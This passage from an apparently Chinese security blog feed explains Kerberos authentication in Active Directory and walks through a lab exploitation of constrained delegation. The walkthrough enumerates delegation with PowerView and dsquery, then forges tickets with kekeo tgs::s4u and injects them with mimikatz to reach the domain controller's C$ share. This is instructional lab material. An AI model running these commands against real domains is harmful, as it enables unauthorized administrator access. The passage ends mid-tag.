&lt;==---------------------------------------------------------- KDC-TGS (TGS解密TGT和服务请求,并向Client-A发送一个服务票据ST(Service Ticket)`KRB_AP_REQ (Kerberos Application Request)`5. Client-A ----------------------------------------------------------==&gt; Server-B (Client-A把服务票据中的服务器部分和请求一起发送到Server-B(Client-A要访问活动目录中的主机),远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的)</code></pre><h2 id="0x02-Kerberos认证过程-详细版"><a href="#0x02-Kerberos认证过程-详细版" class="headerlink" title="0x02 Kerberos认证过程 (详细版)"></a>0x02 Kerberos认证过程 (详细版)</h2><p><img src="/2018/01/18/Kerberos认证相关/Kerberos.jpg" alt="详细版"></p><p>认证或请求服务 的过程如下: </p><h4 id="1-Client-A-—-gt-KDC-AS"><a href="#1-Client-A-—-gt-KDC-AS" class="headerlink" title="1. Client-A —&gt; KDC-AS"></a>1. Client-A —&gt; KDC-AS</h4><pre><code>KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)    a. 客户端Client对用户口令执行散列运算转换为NTLM散列。此散列值(即用户密钥)成为客户端和KDC共享的长期密钥(long term key)。     b. KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)。</code></pre><h4 id="2-Client-A-lt-—-KDC-AS"><a href="#2-Client-A-lt-—-KDC-AS" class="headerlink" title="2. Client-A &lt;— KDC-AS"></a>2. Client-A &lt;— KDC-AS</h4><pre><code>KRB_AS_REP (Kerberos Authentication Service Response) - 身份验证服务(KDC-AS)会解密时间戳,若解密成功(KDC-AS检查用户的信息(登录限制.组成员身份等)并创建票据授予票据(Ticket-Granting Ticket,TGT),并向本地LSA (Local Security Authority)请求生成一个特殊的数据PAC,表明了客户端获得某个特定用户的口令(即验证了用户的身份)。身份验证服务(KDC-AS)向客户端回复两条信息:     a. 短期会话密钥SessionKeya-kdc,用于客户端向KDC发起后续的请求 ,该消息经客户端的长期密钥(long term key)加密。(此短期会话密钥仅适用于该客户端和KDC之间)    b. 票据授予票据(Ticket Granting Ticket,简称TGT),包含有关用户名.域名.时间和组成员资格等信息。TGT票据使用KDC的krbtgt密钥进行加密,PAC使用krbtgt密钥进行进行签名,并且系统很少会验证PAC数据(在Windows环境中为krbtgt账户的NT-Hash)。</code></pre><h4 id="3-Client-A-—-gt-KDC-TGS"><a href="#3-Client-A-—-gt-KDC-TGS" class="headerlink" title="3. Client-A —&gt; KDC-TGS"></a>3. Client-A —&gt; KDC-TGS</h4><pre><code>KRB_TGS_REQ (Kerberos Ticket Granting Service Request) -Client使用AS返回的”短期会话密钥”构建访问特定服务的请求,再把AS返回的”票据授予票据(TGT)”连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REQClient-A使用AS返回的会话密钥SessionKeya-kdc构建访问特定服务的请求。客户端Client再把请求连同TGT一起发送到票据授予服务TGS。(TGT是被KDC的krbtgt密钥加密的，所以Client-A无法解密)黄金票据 - 此过程3可以伪造TGT(前提是获取krbtgt账号的口令散列值)，宣称自己是域内任何账号，包括域管或者不存在的用户，这是黄金票据的原理。</code></pre><h4 id="4-Client-A-lt-—-KDC-TGS"><a href="#4-Client-A-lt-—-KDC-TGS" class="headerlink" title="4. Client-A &lt;— KDC-TGS"></a>4. Client-A &lt;— KDC-TGS</h4><pre><code>KRB_TGS_REP (Kerberos Ticket Granting Service Response) -票据授予服务TGS解密TGT和服务请求,然后如果请求被允许(KDC会打开票据,进行校验和检查。如果DC能够打开票据,并能通过校验和检查,那么会认为TGT为有效票据。此时TGT中的数据会被复制,以创建TGS票据ST),票据授予服务TGS向客户端Client发送一个服务票据(Service Ticket,简称ST),包括两个部分:     a. 远程服务器的部分 - 包含请求用户的组成员资格、时间戳、用于客户端和远程服务器之间通信的会话密钥。使用远程服务器Server-B和KDC共享的长期密钥(long term key)加密这部分消息。    b. 客户端的部分 - 包含用于客户端和远程服务器之间通信的会话密钥SessionKeya-b。(使用步骤2中AS回复的短期会话密钥(SessionKeya-kdc)加密这部分消息生成的会话密钥SessionKeya-b。)</code></pre><h4 id="5-Client-A-—-gt-Server-B"><a href="#5-Client-A-—-gt-Server-B" class="headerlink" title="5. Client-A —&gt; Server-B"></a>5. Client-A —&gt; Server-B</h4><pre><code>KRB_AP_REQ (Kerberos Application Request) - Client-A把服务票据(Service Ticket)中的服务器部分和请求一起发送到Server-B(用户要访问活动目录中的主机)。远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的。解密成功(目标服务会使用自己的NTLM密码散列打开TGS票据,并提取用户的授权数据和会话密钥SessionKeya-b。)即表明KDC已经允许了此次通信。白银票据 - 此过程5可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管，这是白银票据的原理。</code></pre><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><h4 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h4><p>是Windows活动目录中使用的客户/服务器认证协议(windows中的认证协议有两种NTLM和Kerberos),为通信双方提供双向身份认证。</p><p>相互认证或请求服务的实体被称为委托人(principal)。参与的中央服务器被称为密钥分发中心(简称KDC)。</p><p>KDC(密钥分发中心　Key Distribution Center)有两个服务组成 : </p><pre><code>1. AS 身份验证服务(Authentication Server)2. TGS 票据授予服务(Ticket Granting Server)该认证过程的实现不依赖于主机操作系统的认证,无需基于主机地址的信任,不要求网络上所有主机的物理安全,并假定网络上传送的数据包可以被任意地读取.修改和插入数据。在以上情况下, Kerberos 作为一种可信任的第三方认证服务,是通过传统的密码技术(如:共享密钥)执行认证服务的。</code></pre><h4 id="krbtgt账户"><a href="#krbtgt账户" class="headerlink" title="krbtgt账户"></a>krbtgt账户</h4><p>每个域控制器DC都有一个”krbtgt”的用户账户,是KDC的服务账户,用来创建票据授予服务(TGS)加密的密钥。</p><h4 id="Principal-委托人"><a href="#Principal-委托人" class="headerlink" title="Principal　委托人"></a>Principal　委托人</h4><p>一个具有唯一标识的实体,可以是一台计算机或一项服务,通过使用KDC颁发的票据来进行通信。委托人可以分为两类: 用户和服务,分别具有不同种类的标识符。Kerberos信任模型的核心是每个委托人(principal)和KDC的通信是在利用仅双方可知的密钥构建的安全通道中进行。</p><p>当委托人(principal)之间需要通信的时候,它们再使用KDC生成的会话密钥。</p><pre><code>1. 用户 (UPN)    用户通过如&quot;user@REALM&quot;格式的用户主体名称(User Principal Name,简称UPN)来标识。记住REALM一定是大写的。2. 服务 (SPN)    服务主体名称(Service Principal Name,简称SPN)是Kerberos身份验证服务(AS)所必需。    用于域中的服务和计算机账户。SPN的格式形如&quot;serviceclass/host_port/serviceName&quot;。    例如, 主机&quot;dc1.bhusa.com&quot;上LDAP服务的SPN可能类似于&quot;ldap/dc1.bhusa.com&quot;, &quot;ldap/dc1&quot;和&quot;ldap/dc1.bhusa.com/bhusa.com&quot;。    参考全限定主机名和仅主机名,一个服务可能注册为多个SPN。(同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么是微软Kerberos环境中的一个必要组件。查询服务的&quot;规范化&quot;名称,然后生成请求服务的SPN。)</code></pre><p><code>枚举域帐户的SPN</code></p><pre><code>GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1Find-PSServiceAccounts.ps1 - https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccountsPowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089</code></pre><p><img src="/2018/01/18/Kerberos认证相关/getspn.png" alt="getspn"></p><h4 id="PAC-Privilege-Access-Certificate-特权访问证书"><a href="#PAC-Privilege-Access-Certificate-特权访问证书" class="headerlink" title="PAC (Privilege Access Certificate 特权访问证书)"></a>PAC (Privilege Access Certificate 特权访问证书)</h4><p>KDC在向Kerberos客户端颁发TGT时,会向本地LSA (Local Security Authority)请求生成一个特殊的数据结构,名为”特权访问证书”这个PAC包含为Kerberos客户端构建一个本地访问令牌所需的用户信息,他同时使用域控制器服务器的私钥和KDC服务器的私钥来进行数字签署,以防假的KDC伪造PAC。</p><p><code>PAC数据结构</code></p><pre><code>1. 用户的登入时间以及用户会话额到期时间2. 用户上一次设置密码的时间,以及允许他再次更改密码的时间3. 用户的经典登入名,domain\user4. 用户的显示名称5. 指派给用户账户的经典NT登入脚本的名称(如果有的话)6. 用户漫游配置文件的UNC路径7. 客户端主目录的UNC路径8. 用户的并发登入数9. 在颁发PAC的KDC处,自从上一次成功登入以来,所允许的不成功登入尝试次10. 用户的RID11. 用户的&quot;主要组&quot;的RID,只限在POSIX使用12. 在域中,将用户作为一个成员的组的数量,以及每个组的RID13. 适用于用户的已知SID14. 域的SID15. 资源域的SID</code></pre><p>除此之外,PAC中还嵌入了另一个名为<code>用户账户控制</code>的数据结构<br>如何得到</p><p>powerview </p><pre><code>Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| flGet-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</code></pre><p>dsquery</p><pre><code>dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegatetodsquery * -l -limit 0 -filter &quot;&amp;(!objectClass=computer)(servicePrincipalName=*)&quot; -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontroldsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto</code></pre><h4 id="LSA-Local-Security-Authority"><a href="#LSA-Local-Security-Authority" class="headerlink" title="LSA (Local Security Authority)"></a>LSA (Local Security Authority)</h4><p>LSA管理本地安全策略、管理审计策略和设置、为用户生成包含SID和组权限关系的令牌。LSA验证的过程: LSA通过访问本地SAM(Security Accounts Manager)数据库,可以完成本地用户的验证。</p><p><code>LSA的处理流程</code>: </p><pre><code>1. LSA首先会把身份凭据交给SSPI,由该接口负责与Kerberos和NTLM服务沟通。2. SSPI不能确定用户是本地登录还是域账户进行域登录。所以他会先把身份认证请求传递到Kerberos SSP。3. Kerberos SSP会验证用户的登入目标是本地计算机还是域。如果是登录域,Kerberos SSP将继续处理。如果是本地计算机,即用户不是登录域,Kerberos SSP返回一个错误消息到SSPI,交回给GINA处理,使服务器登录不可用。4. SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM (Local Security Account Manager,本地安全账户管理器)数据库进行身份认证。使用NTLM SSP的身份认证过程与Windows NT系统的身份认证方法是相同的。</code></pre><h4 id="相关"><a href="#相关" class="headerlink" title="相关"></a>相关</h4><p><strong>krbtgt 密码</strong></p><p>它是整个活动目录中唯一的不会自动更新的密码。<br>除非:</p><pre><code>第一种情况: 域功能级别(domain functional level,简称DFL)从NT5(2000/2003)升级到NT6(2008/2012)。第二种情况: 利用域的恢复数据来实施域的裸机恢复(bare metal recovery)。</code></pre><p><strong>Kerberos智能卡进行身份认证</strong></p><p>Kerberos也允许使用PKI和智能卡进行身份认证。用户会被提示输入一个智能卡的PIN码,而不是口令。</p><p>Windows使用PIN码来访问智能卡上的公钥证书(public key certification)。利用智能卡的私钥签名该证书,并发送到KDC。</p><p>KDC验证证书上的签名是否源于可信实体。然后KDC发送公钥证书加密过的TGT。既然信息只能被智能卡的私钥解密,用户也就通过了域的身份认证。</p><p>然而,对于使用智能卡进行身份认证的账户来说,密码的散列值仍然存储在域控服务器上。此外,智能卡只能对”交互式会话(interactive sessions)”提供保护。</p><p>也就意味着智能卡认证仅能用于登录域中的计算机。</p><h4 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h4><pre><code>深入解读MS14-068漏洞:微软精心策划的后门?    http://www.freebuf.com/vuls/56081.html敞开的地狱之门:Kerberos协议的滥用    http://www.freebuf.com/articles/system/45631.html你所不知道的Kerberos 整理笔记(三)    http://www.voidcn.com/article/p-nnpovuml-ng.html</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Kerberos认证过程-简易版&quot;&gt;&lt;a href=&quot;#0x01-Kerberos认证过程-简易版&quot; class=&quot;headerlink&quot; title=&quot;0x01 Kerberos认证过程 (简易版)&quot;&gt;&lt;/a&gt;0x01 Kerberos认证过程 (简易版)&lt;/h2&gt;
    
    </summary>
    
      <category term="技术相关" scheme="https://sp4rr0w.github.io/categories/%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="KDC" scheme="https://sp4rr0w.github.io/tags/KDC/"/>
    
      <category term="Kerberos" scheme="https://sp4rr0w.github.io/tags/Kerberos/"/>
    
      <category term="笔记" scheme="https://sp4rr0w.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>利用域委派获取域某些权限</title>
    <link href="https://sp4rr0w.github.io/2018/01/13/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%9F%90%E4%BA%9B%E6%9D%83%E9%99%90/"/>
    <id>https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/</id>
    <published>2018-01-13T15:13:00.000Z</published>
    <updated>2018-03-28T01:36:21.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-域委派"><a href="#0x01-域委派" class="headerlink" title="0x01 域委派"></a>0x01 域委派</h2><a id="more"></a><p>将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p><p>域内委派主要有3种应用方式：</p><pre><code>一. 非约束性委派Unconstrained Delegation     服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。    举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。    从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。二. 约束性委派Constrained Delegation    即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；三. 协议传递    即Kerberos的扩展协议S4U2Self，服务账号针对某一个特定服务，可查询获取任意用户的TGS，从而能模拟任意用户访问该特定服务。</code></pre><p>在Windows系统中，普通用户的属性中没有委派Delegation这个选项卡，只有服务账号、主机账号才有</p><pre><code>WIN10-NEW$ ： 192.168.19.8        加入域 DEMO.LOCALowa2010dc$   ： 192.168.19.10    域服務器：DEMO.LOCALtestwin10 : 域用戶</code></pre><p>在域DEMO.LOCAL上设置WIN10-NEW$的delegation(在Service Manager -&gt; Roles -&gt; demo.local的computers里找到WIN10-NEW$右键设置)，</p><pre><code>--&gt; Trust the computer for delegation to specified service only    --&gt; Use any authentication protocol        --&gt; 点击add -&gt; 点击find now             --&gt; owa2010dc(域机器名) -&gt;ok-&gt;ok                --&gt; 选取cifs协议(共享)![delegation](利用域委派获取域某些权限/delegation.png)</code></pre><p>查询服务账户(或者机器账号)的域委派权限方法</p><pre><code>ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;*&quot;ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;cn,givenName,displayname,samAccountName,mail,department,title,description,scriptPath&quot;</code></pre><p>因爲ldifde導出的WIN10-NEW机器账号： </p><pre><code>userAccountControl: 16781312WORKSTATION_TRUST_ACCOUNT : 4096TRUSTED_FOR_DELEGATION : 16777216==&gt; 16777216 + 4096 = 16781312</code></pre><p>根據<a href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx</a>  符合規則。</p><pre><code>属性标志 十进制SCRIPT                                  = 1,        // 0x1ACCOUNTDISABLE                          = 2,        // 0x2HOMEDIR_REQUIRED                        = 8,        // 0x8LOCKOUT                                 = 16,       // 0x10PASSWD_NOTREQD                          = 32,       // 0x20PASSWD_CANT_CHANGE                      = 64,       // 0x40ENCRYPTED_TEXT_PASSWORD_ALLOWED         = 128,      // 0x80TEMP_DUPLICATE_ACCOUNT                  = 256,      // 0x100NORMAL_ACCOUNT                          = 512,      // 0x200INTERDOMAIN_TRUST_ACCOUNT               = 2048,     // 0x800WORKSTATION_TRUST_ACCOUNT               = 4096,     // 0x1000SERVER_TRUST_ACCOUNT                    = 8192,     // 0x2000DONT_EXPIRE_PASSWD                      = 65536,    // 0x10000MNS_LOGON_ACCOUNT                       = 131072,   // 0x20000SMARTCARD_REQUIRED                      = 262144,   // 0x40000TRUSTED_FOR_DELEGATION                  = 524288,   // 0x80000NOT_DELEGATED                           = 1048576,  // 0x100000USE_DES_KEY_ONLY                        = 2097152,  // 0x200000DONT_REQUIRE_PREAUTH                    = 4194304,  // 0x400000PASSWORD_EXPIRED                        = 8388608,  // 0x800000TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION  = 16777216 // 0x1000000</code></pre><p>或者<code>PowerView</code>的Get-DomainComputer(<a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>  ) ：<br>通过PowerShell脚本枚举域内所有的机器账号，查看哪些账号被设置了<code>委派</code>，以及是何种类型的委派设置(获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegatetol)：</p><pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fldistinguishedname        : CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=localmsds-allowedtodelegateto :name                     : OWA2010DCuseraccountcontrol       : 532480distinguishedname        : CN=OWA2010,CN=Computers,DC=demo,DC=localmsds-allowedtodelegateto :name                     : OWA2010useraccountcontrol       : 4096distinguishedname        : CN=WIN10-NEW,CN=Computers,DC=demo,DC=localmsds-allowedtodelegateto : {cifs/OWA2010DC.demo.local/demo.local, cifs/OWA2010DC.demo.local, cifs/OWA2010DC, cifs/OWA20                           10DC.demo.local/DEMO...}name                     : WIN10-NEWuseraccountcontrol       : 16781312</code></pre><p><img src="/2018/01/13/利用域委派获取域某些权限/computerproperty.png" alt="computerproperty"></p><p>或者PowerView的Get-UserProperty(通过PowerShell脚本枚举域内所有的用戶账号)：</p><pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| flname                     : Administratordistinguishedname        : CN=Administrator,CN=Users,DC=demo,DC=localuseraccountcontrol       : 66048msds-allowedtodelegateto :name                     : Guestdistinguishedname        : CN=Guest,CN=Users,DC=demo,DC=localuseraccountcontrol       : 66082msds-allowedtodelegateto :name                     : krbtgtdistinguishedname        : CN=krbtgt,CN=Users,DC=demo,DC=localuseraccountcontrol       : 514msds-allowedtodelegateto :name                     : testwin10distinguishedname        : CN=testwin10,CN=Users,DC=demo,DC=localuseraccountcontrol       : 524800msds-allowedtodelegateto :</code></pre><p>或者 (获取机器的所有SPN信息 包括useraccountcontrol,msds-allowedtodelegateto)</p><pre><code>C:\Users\Administrator&gt;dsquery * -l -limit 0 -filter &quot;&amp;(!objectClass=computer)(servicePrincipalName=*)&quot; -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontrolserviceprincipalname: kadmin/changepwname: krbtgtsamaccountname: krbtgtmemberof: CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=localpwdlastset: 131182114793700226distinguishedname: CN=krbtgt,CN=Users,DC=demo,DC=localuseraccountcontrol: 514serviceprincipalname: test/testname: testwin10samaccountname: testwin10memberof:pwdlastset: 131602140228263620distinguishedname: CN=testwin10,CN=Users,DC=demo,DC=localuseraccountcontrol: 524800</code></pre><p>或者 PowerShell脚本枚举域帐户的SPN</p><ol><li><p>GetUserSPNs - kerberoast<br><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p><p> PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1<br> ServicePrincipalName : kadmin/changepw<br> Name                 : krbtgt<br> SAMAccountName       : krbtgt<br> MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br> PasswordLastSet      : 9/13/2016 11:37:59 AM</p><p> ServicePrincipalName : test/test<br> Name                 : testwin10<br> SAMAccountName       : testwin10<br> MemberOf             :<br> PasswordLastSet      : 1/12/2018 3:00:22 PM</p></li><li><p>Get-NetUser - PowerView</p><p> PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn<br> objectsid              : S-1-5-21-1239069908-882060383-2558203358-502<br> iscriticalsystemobject : True<br> samaccounttype         : 805306368<br> primarygroupid         : 513<br> instancetype           : 4<br> badpasswordtime        : 1/1/1601 8:00:00 AM<br> lastlogoff             : 1/1/1601 8:00:00 AM<br> whenchanged            : 1/12/2018 6:32:42 AM<br> badpwdcount            : 0<br> useraccountcontrol     : 514<br> usncreated             : 12324<br> countrycode            : 0<br> admincount             : 1<br> objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br> objectclass            : {top, person, organizationalPerson, user}<br> logoncount             : 0<br> lastlogon              : 1/1/1601 8:00:00 AM<br> serviceprincipalname   : kadmin/changepw<br> adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local<br> dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}<br> distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local<br> cn                     : krbtgt<br> pwdlastset             : 9/13/2016 11:37:59 AM<br> objectguid             : 547b1f4b-4f25-4a4f-96e9-2480d6f2e896<br> whencreated            : 9/13/2016 3:37:59 AM<br> description            : Key Distribution Center Service Account<br> samaccountname         : krbtgt<br> showinadvancedviewonly : True<br> memberof               : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br> accountexpires         : 9223372036854775807<br> usnchanged             : 28705<br> name                   : krbtgt<br> codepage               : 0<br> objectsid             : S-1-5-21-1239069908-882060383-2558203358-1126<br> samaccounttype        : 805306368<br> primarygroupid        : 513<br> instancetype          : 4<br> badpasswordtime       : 1/17/2018 8:47:37 PM<br> accountexpires        : 0<br> whenchanged           : 1/13/2018 3:43:54 AM<br> badpwdcount           : 0<br> useraccountcontrol    : 524800<br> name                  : testwin10<br> codepage              : 0<br> objectclass           : {top, person, organizationalPerson, user}<br> logoncount            : 23<br> lastlogon             : 1/18/2018 7:37:12 AM<br> serviceprincipalname  : test/test<br> usncreated            : 32796<br> dscorepropagationdata : {1/13/2018 3:43:54 AM, 1/1/1601 12:00:00 AM}<br> distinguishedname     : CN=testwin10,CN=Users,DC=demo,DC=local<br> cn                    : testwin10<br> pwdlastset            : 1/12/2018 3:00:22 PM<br> objectguid            : 2d8ce475-2bd9-4827-a3ed-6e8b4695d516<br> whencreated           : 1/12/2018 7:00:22 AM<br> samaccountname        : testwin10<br> countrycode           : 0<br> objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br> adspath               : LDAP://CN=testwin10,CN=Users,DC=demo,DC=local<br> usnchanged            : 33123<br> lastlogoff            : 1/1/1601 8:00:00 AM<br> lastlogontimestamp    : 1/12/2018 3:00:40 PM</p></li></ol><p>或者 (使用dsquery获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegateto)</p><pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto  cn           operatingSystem                      distinguishedName                                      useraccountcontrol    msds-allowedtodelegateto  OWA2010DC    Windows Server 2008 R2 Datacenter    CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local    532480  OWA2010      Windows Server 2008 R2 Datacenter    CN=OWA2010,CN=Computers,DC=demo,DC=local               4096  WIN10-NEW    Windows 10 Enterprise 2016 LTSB      CN=WIN10-NEW,CN=Computers,DC=demo,DC=local             16781312              cifs/OWA2010DC.demo.local/demo.local;cifs/OWA2010DC.demo.local;cifs/OWA2010DC;cifs/OWA2010DC.demo.local/DEMO;cifs/OWA2010DC/DEMO;</code></pre><p>或者 (获取用戶某些信息 包括useraccountcontrol)</p><pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto  cn             distinguishedName                             useraccountcontrol        msds-allowedtodelegateto  Administrator  CN=Administrator,CN=Users,DC=demo,DC=local 66048  Guest          CN=Guest,CN=Users,DC=demo,DC=local         66082  krbtgt         CN=krbtgt,CN=Users,DC=demo,DC=local         514  testwin10      CN=testwin10,CN=Users,DC=demo,DC=local     524800</code></pre><p>测试主机为域内Windows 10系统，现在以普通域用户testwin10登录系统，IPC方式连接域服务器，访问域服务器的C盘目录，显示被拒绝，权限不够。</p><p>C:\Users\testwin10&gt;whoami</p><pre><code>demo\testwin10</code></pre><p>C:\Users\testwin10&gt;dir \owa2010dc.demo.local\c$</p><pre><code>Access is denied.</code></pre><p><img src="/2018/01/13/利用域委派获取域某些权限/testwin10.png" alt="testwin10"></p><p>现在已知域内机器账号的口令(计算机的机器账号密码默认是随机的，每30天轮换一次)，则可使用kekeo工具构造WIN10-NEW机器账号的票据。命令和执行结果如下</p><pre><code>tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b</code></pre><p>已知域内主机账号(机器账号WIN10-NEW$)，使用kekeo工具构造该主机账号的TGT票据 ： </p><pre><code>(如果是服务账号的话命令就是：tgt::ask /user:sqlsrv /domain:demo.local /password:xxx /ticket:sqlsrv.kirbi)kekeo # tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13bRealm        : demo.local (demo)User         : WIN10-NEW$ (WIN10-NEW$)CName        : WIN10-NEW$       [KRB_NT_PRINCIPAL (1)]SName        : krbtgt/demo.local        [KRB_NT_SRV_INST (2)]Need PAC     : YesAuth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5b8303606d3478a49e47650272fea13b[kdc] name: OWA2010DC.demo.local (auto)[kdc] addr: 192.168.18.10 (auto)  Ticket in file &#39;TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi&#39;使用kekeo工具构造该主机账号的TGT票据![kekeo](利用域委派获取域某些权限/kekeo.png)</code></pre><p>由于设置了约束性委派所以利用刚才的WIN10-NEW$的TGT票据，像域服务器发起申请访问域服务器相应服务(CIFS共享服务)管理权限的TGS票据 ： </p><pre><code>Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access</code></pre><p>即：</p><pre><code>kekeo # tgs::s4u /tgt:TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi /user:administrator@demo.local /service:cifs/OWA2010DC.demo.localTicket  : TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi  [krb-cred]     S: krbtgt/demo.local @ DEMO.LOCAL  [krb-cred]     E: [00000012] aes256_hmac  [enc-krb-cred] P: WIN10-NEW$ @ DEMO.LOCAL  [enc-krb-cred] S: krbtgt/demo.local @ DEMO.LOCAL  [enc-krb-cred] T: [1/12/2018 2:17:58 AM ; 1/12/2018 12:17:58 PM] {R:1/19/2018 2:17:58 AM}  [enc-krb-cred] F: [40e00000] pre_authent ; initial ; renewable ; forwardable ;  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): a9e1f34bc1c62de37793943742e0f235a4ba0a0ec01a9899f52b1e9e7798970c  [s4u2self]  administrator@demo.local[kdc] name: OWA2010DC.demo.local (auto)[kdc] addr: 192.168.18.10 (auto)  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi&#39;Service(s):  [s4u2proxy] cifs/OWA2010DC.demo.local  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi&#39;</code></pre><p>向域服务器发起申请访问域服务器相应服务(CIFS服务)管理权限的TGS票据<br><img src="/2018/01/13/利用域委派获取域某些权限/cfis1.png" alt="cfis1"></p><p>ok</p><p>此时内存中已经有了访问域服务器CIFS服务的域管理员的TGS票据，需要将该票据(administrator的TGS票据)注入当前的会话中，使用mimikatz的kerberos::ptt命令可完成票据的注入。<br>注入票据后，当前的会话具备了访问域服务器C盘目录的权限 kekeo ticket 注入 </p><pre><code>kerberos::ptt TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi</code></pre><p>注入票据后，访问域服务器C盘目录的权限<br><img 